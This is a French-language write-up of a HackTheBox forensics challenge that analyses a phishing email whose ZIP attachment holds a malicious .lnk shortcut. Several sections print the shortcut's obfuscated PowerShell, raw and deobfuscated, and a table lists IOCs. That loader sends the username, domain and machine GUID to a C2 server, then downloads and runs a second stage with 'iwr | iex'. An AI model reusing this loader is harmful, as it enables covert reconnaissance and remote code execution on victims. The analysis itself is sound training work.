# AoTR 1: A Call from the Museum - Write-up Sherlock

![HTB AoTR](https://img.shields.io/badge/HackTheBox-AoTR%201-green)![Difficulty](https://img.shields.io/badge/Difficulty-Easy-yellow)![Category](https://img.shields.io/badge/Category-Forensics-purple)

## Scénario

Un employé du musée reçoit un email urgent concernant des mises à jour de conformité sanitaire pour un événement transfrontalier. L'email contient une archive ZIP protégée par mot de passe avec un fichier .lnk malveillant qui exécute un script PowerShell. L'objectif est d'analyser l'email et le malware pour identifier la chaîne d'infection.

## Fichiers fournis

- `URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml` - L'email de phishing
- `Part 1 - A Call from the Museum.pdf` - Contexte du challenge

---

## Tâche 1 : Who is the suspicious sender of the email?

**Réponse** : `eu-health@ca1e-corp.org`

**Étapes** :

1. Ouvrir le fichier `.eml` et lire les headers :
```bash
head -50 "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
```

2. Chercher l'en-tête `From` :
```
From: EU Health Logistics Office <eu-health@ca1e-corp.org>
```

**Note** : Le domaine `ca1e-corp.org` est du typosquatting de `cale-corp.org` (le `l` est remplacé par `1`).

---

## Tâche 2 : What is the legitimate server that initially sent the email?

**Réponse** : `BG1P293CU004.outbound.protection.outlook.com`

**Étapes** :

1. Chercher les en-têtes `Received` dans le fichier `.eml` :
```bash
grep -i "^Received:" "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
```

2. Le premier `Received` indique le serveur d'origine :
```
Received: from BG1P293CU004.outbound.protection.outlook.com
 (mail-serbianorthazon11020077.outbound.protection.outlook.com [52.101.176.77])
```

---

## Tâche 3 : What is the attachment filename?

**Réponse** : `Health_Clearance-December_Archive.zip`

**Étapes** :

1. Chercher l'en-tête `X-Attached` ou `Content-Disposition` :
```bash
grep -i "X-Attached\|filename=" "URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml"
```

2. Résultat :
```
X-Attached: Health_Clearance-December_Archive.zip
Content-Disposition: attachment; filename="Health_Clearance-December_Archive.zip"
```

---

## Tâche 4 : What is the Document Code?

**Réponse** : `EU-HMU-24X`

**Étapes** :

### 4.1 Extraire la pièce jointe de l'email

Le corps de l'email est en HTML encodé en base64. La pièce jointe est aussi encodée en base64.

```bash
# Créer un dossier pour l'extraction
mkdir -p extracted

# Script Python pour extraire la pièce jointe
python3 << 'EOF'
import email
from email import policy
from email.parser import BytesParser
import os

os.makedirs('extracted', exist_ok=True)

with open('URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml', 'rb') as f:
    msg = BytesParser(policy=policy.default).parse(f)

for part in msg.walk():
    filename = part.get_filename()
    if filename:
        print(f"[+] Pièce jointe trouvée: {filename}")
        content = part.get_payload(decode=True)
        with open(f'extracted/{filename}', 'wb') as out:
            out.write(content)
        print(f"[+] Sauvegardé dans: extracted/{filename}")
EOF
```

### 4.2 Trouver le mot de passe de l'archive

Le mot de passe est dans le corps HTML de l'email. On peut le décoder :

```bash
# Extraire et décoder le corps HTML
python3 << 'EOF'
import email
from email import policy
from email.parser import BytesParser

with open('URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml', 'rb') as f:
    msg = BytesParser(policy=policy.default).parse(f)

for part in msg.walk():
    if part.get_content_type() == 'text/html':
        html = part.get_payload(decode=True).decode('utf-8')
        # Chercher le mot de passe
        if 'password' in html.lower():
            # Afficher la partie pertinente
            import re
            match = re.search(r'Archive password.*?<[^>]*>([^<]+)<', html, re.IGNORECASE | re.DOTALL)
            if match:
                print(f"[+] Mot de passe trouvé: {match.group(1)}")
EOF
```

**Mot de passe trouvé** : `Up7Pk99G`

### 4.3 Extraire l'archive ZIP

```bash
cd extracted
unzip -P 'Up7Pk99G' Health_Clearance-December_Archive.zip
```

**Fichiers extraits** :
- `EU_Health_Compliance_Portal.lnk` (fichier malveillant)
- `Health_Clearance_Guidelines.pdf` (document leurre)

### 4.4 Lire le PDF pour trouver le Document Code

```bash
# Option 1: Ouvrir le PDF avec un lecteur
open Health_Clearance_Guidelines.pdf

# Option 2: Extraire le texte avec pdftotext
pdftotext Health_Clearance_Guidelines.pdf - | head -20
```

**Le Document Code est dans le sous-titre** :
```
European Cross-Border Festive Operations — Document Code EU-HMU-24X — December Cycle
```

---

## Tâche 5 : What is the full URL of the C2 contacted through a POST request?

**Réponse** : `https://health-status-rs.com/api/v1/checkin`

**Étapes** :

### 5.1 Analyser le fichier LNK malveillant

Les fichiers `.lnk` Windows contiennent des arguments de commande. On extrait les chaînes Unicode :

```bash
cd extracted

# Script Python pour extraire les chaînes Unicode du LNK
python3 << 'EOF'
with open('EU_Health_Compliance_Portal.lnk', 'rb') as f:
    data = f.read()

print("[+] Extraction des chaînes Unicode du fichier LNK...\n")

i = 0
while i < len(data) - 2:
    # Chercher des caractères ASCII suivis de 0x00 (UTF-16LE)
    if data[i] >= 0x20 and data[i] < 0x7f and data[i+1] == 0:
        chars = []
        while i < len(data) - 1 and data[i] >= 0x20 and data[i] < 0x7f and data[i+1] == 0:
            chars.append(chr(data[i]))
            i += 2
        s = ''.join(chars)
        if len(s) > 50:  # Afficher seulement les longues chaînes
            print(s)
            print("-" * 60)
    else:
        i += 1
EOF
```

### 5.2 Script PowerShell extrait

On trouve la commande PowerShell obfusquée :

```powershell
-nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));saps .\Health_Clearance_Guidelines.pdf;$AX=$env:USERNAME;$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');$Bz=$env:USERDOMAIN;$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;$pP = @{u=$AX;d=$Bz;g=$Mw};$Zu=(iwr $oM -Method POST -Body $pP).Content;$Hd = @{Authorization = $Bs };iwr -Headers $Hd $Lj$Zu | iex;"
```

### 5.3 Décoder l'URL C2

L'URL est encodée en URL-encoding :

```bash
python3 -c "
import urllib.parse
url_encoded = 'https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin'
print(urllib.parse.unquote(url_encoded))
"
```

**Résultat** : `https://health-status-rs.com/api/v1/checkin`

---

## Tâche 6 : The malicious script sent three pieces of information in the POST request. What is the registry key from which the last one is retrieved?

**Réponse** : `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`

**Étapes** :

Dans le script PowerShell, on identifie les 3 variables envoyées dans le POST :

```powershell
$AX = $env:USERNAME                                              # 1ère info
$Bz = $env:USERDOMAIN                                            # 2ème info
$Mw = (gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid     # 3ème info

$pP = @{u=$AX; d=$Bz; g=$Mw}   # Corps du POST
$Zu = (iwr $oM -Method POST -Body $pP).Content
```

| Variable | Clé POST | Valeur | Source |
|----------|----------|--------|--------|
| `$AX` | `u` | Nom d'utilisateur | `$env:USERNAME` |
| `$Bz` | `d` | Domaine | `$env:USERDOMAIN` |
| `$Mw` | `g` | GUID machine | Registre Windows |

La 3ème info (`g`) vient de la clé : `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`

---

## Tâche 7 : Then the script downloads and executes a second stage from another URL. What is the domain?

**Réponse** : `advent-of-the-relics-forum.htb.blue`

**Étapes** :

### 7.1 Identifier l'URL du second stage dans le script

```powershell
$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D')
```

### 7.2 Décoder l'URL

```bash
python3 -c "
import urllib.parse
url_encoded = 'https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D'
url = urllib.parse.unquote(url_encoded)
print(f'URL complète: {url}')
print(f'Domaine: {url.split(\"/\")[2]}')
"
```

**Résultat** :
- URL complète : `https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=`
- Domaine : `advent-of-the-relics-forum.htb.blue`

---

## Tâche 8 : A set of credentials was used to access the previous resource. Retrieve them.

**Réponse** : `svc_temp:SnowBlackOut_2026!`

**Étapes** :

### 8.1 Rappel : d'où viennent les données ?

À la **Tâche 5**, on a extrait le script PowerShell du fichier LNK. Voici le script complet :

```powershell
-nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));saps .\Health_Clearance_Guidelines.pdf;$AX=$env:USERNAME;$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');$Bz=$env:USERDOMAIN;$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;$pP = @{u=$AX;d=$Bz;g=$Mw};$Zu=(iwr $oM -Method POST -Body $pP).Content;$Hd = @{Authorization = $Bs };iwr -Headers $Hd $Lj$Zu | iex;"
```

### 8.2 Identifier les credentials dans le script

Regardons le **début** du script :

```powershell
$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'))
```

Et la **fin** du script :

```powershell
$Hd = @{Authorization = $Bs }
iwr -Headers $Hd $Lj$Zu | iex
```

**Explication** :
- `$Bs` contient le header d'authentification HTTP "Basic Auth"
- Il est utilisé dans `$Hd = @{Authorization = $Bs}` pour s'authentifier au second stage
- L'attaquant a **découpé la chaîne en fragments** pour éviter la détection (obfuscation)

### 8.3 Comprendre l'obfuscation

La fonction PowerShell `-join()` concatène tous les fragments :

```
'Basic c3' + 'ZjX3Rlb' + 'XA6U2' + '5' + 'vd0JsY' + 'WNrT' + '3V' + '0X' + 'zIwM' + 'jYh'
                                    ↓
                    'Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh'
```

Le format `Basic <base64>` est le standard HTTP Basic Authentication.

### 8.4 Décoder le Base64

```bash
python3 << 'EOF'
import base64

# Les fragments viennent DIRECTEMENT du script PowerShell extrait du LNK
# On les recopie tels quels :
fragments = ['Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh']

# Étape 1 : Reconstruire (ce que fait -join() en PowerShell)
full_header = ''.join(fragments)
print(f"[1] Header reconstitué: {full_header}")

# Étape 2 : Extraire la partie Base64 (après "Basic ")
b64_part = full_header.replace("Basic ", "")
print(f"[2] Partie Base64: {b64_part}")

# Étape 3 : Décoder le Base64
credentials = base64.b64decode(b64_part).decode()
print(f"[3] Credentials décodés: {credentials}")

# Étape 4 : Séparer username:password
username, password = credentials.split(':')
print(f"\n[+] Username: {username}")
print(f"[+] Password: {password}")
EOF
```

**Résultat** :
```
[1] Header reconstitué: Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
[2] Partie Base64: c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
[3] Credentials décodés: svc_temp:SnowBlackOut_2026!

[+] Username: svc_temp
[+] Password: SnowBlackOut_2026!
```

### 8.5 Résumé visuel

```
Script PowerShell (extrait du LNK)
         │
         ▼
$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'))
         │
         │  -join() concatène les fragments
         ▼
"Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh"
         │
         │  Enlever "Basic "
         ▼
"c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh"
         │
         │  Décoder Base64
         ▼
"svc_temp:SnowBlackOut_2026!"
         │
         │  Séparer par ":"
         ▼
Username: svc_temp
Password: SnowBlackOut_2026!
```

---

## Analyse du malware

### Chaîne d'infection

```
1. Email phishing
   └── Pièce jointe: Health_Clearance-December_Archive.zip (mot de passe: Up7Pk99G)
       ├── Health_Clearance_Guidelines.pdf (leurre)
       └── EU_Health_Compliance_Portal.lnk (malveillant)
           └── Exécute PowerShell
               ├── Ouvre le PDF leurre
               ├── Collecte infos système (USERNAME, USERDOMAIN, MachineGuid)
               ├── POST vers C2: health-status-rs.com
               └── Télécharge et exécute second stage depuis advent-of-the-relics-forum.htb.blue
```

### Script PowerShell déobfusqué

```powershell
# Header Basic Auth (obfusqué en fragments)
$Bs = "Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh"

# Ouvre le PDF leurre
Start-Process .\Health_Clearance_Guidelines.pdf

# Collecte 3 infos système
$AX = $env:USERNAME
$Bz = $env:USERDOMAIN
$Mw = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid

# Envoie POST au C2
$pP = @{u=$AX; d=$Bz; g=$Mw}
$Zu = (Invoke-WebRequest "https://health-status-rs.com/api/v1/checkin" -Method POST -Body $pP).Content

# Télécharge et exécute le second stage avec Basic Auth
$Hd = @{Authorization = $Bs}
Invoke-WebRequest -Headers $Hd "https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=$Zu" | Invoke-Expression
```

---

## Indicateurs de compromission (IOCs)

| Type | Valeur |
|------|--------|
| Email (expéditeur) | `eu-health@ca1e-corp.org` |
| Domaine (typosquatting) | `ca1e-corp.org` |
| Domaine (C2) | `health-status-rs.com` |
| Domaine (stage 2) | `advent-of-the-relics-forum.htb.blue` |
| URL (C2 POST) | `https://health-status-rs.com/api/v1/checkin` |
| URL (stage 2) | `https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=` |
| Fichier | `Health_Clearance-December_Archive.zip` |
| Fichier | `EU_Health_Compliance_Portal.lnk` |
| Fichier | `Health_Clearance_Guidelines.pdf` |
| Credentials | `svc_temp:SnowBlackOut_2026!` |
| Registry Key | `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` |

---

## Commandes utiles

```bash
# 1. Extraire les pièces jointes de l'email
python3 -c "
import email
from email import policy
from email.parser import BytesParser
import os

os.makedirs('extracted', exist_ok=True)
with open('URGENT_ Updated Health & Customs Compliance for Cross-Border Festive Event.eml', 'rb') as f:
    msg = BytesParser(policy=policy.default).parse(f)

for part in msg.walk():
    filename = part.get_filename()
    if filename:
        content = part.get_payload(decode=True)
        with open(f'extracted/{filename}', 'wb') as f:
            f.write(content)
        print(f'Extracted: {filename}')
"

# 2. Extraire l'archive protégée par mot de passe
cd extracted
unzip -P 'Up7Pk99G' Health_Clearance-December_Archive.zip

# 3. Extraire les chaînes Unicode du fichier LNK
python3 -c "
with open('EU_Health_Compliance_Portal.lnk', 'rb') as f:
    data = f.read()

i = 0
while i < len(data) - 2:
    if data[i] >= 0x20 and data[i] < 0x7f and data[i+1] == 0:
        chars = []
        while i < len(data) - 1 and data[i] >= 0x20 and data[i] < 0x7f and data[i+1] == 0:
            chars.append(chr(data[i]))
            i += 2
        s = ''.join(chars)
        if len(s) > 20:
            print(s)
    else:
        i += 1
"

# 4. Décoder les URLs et credentials
python3 -c "
import urllib.parse
import base64

# URL C2
print('C2 URL:', urllib.parse.unquote('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin'))

# URL stage 2
print('Stage 2:', urllib.parse.unquote('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D'))

# Credentials
b64 = 'c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh'
print('Credentials:', base64.b64decode(b64).decode())
"
```

---

## Techniques MITRE ATT&CK

| ID | Technique | Description |
|----|-----------|-------------|
| T1566.001 | Phishing: Spearphishing Attachment | Email avec pièce jointe malveillante |
| T1204.002 | User Execution: Malicious File | Exécution du fichier .lnk par l'utilisateur |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Exécution de script PowerShell |
| T1027 | Obfuscated Files or Information | URLs encodées, Basic Auth fragmenté |
| T1082 | System Information Discovery | Collecte USERNAME, USERDOMAIN, MachineGuid |
| T1071.001 | Application Layer Protocol: Web Protocols | Communication C2 via HTTPS |
| T1105 | Ingress Tool Transfer | Téléchargement du second stage |

---
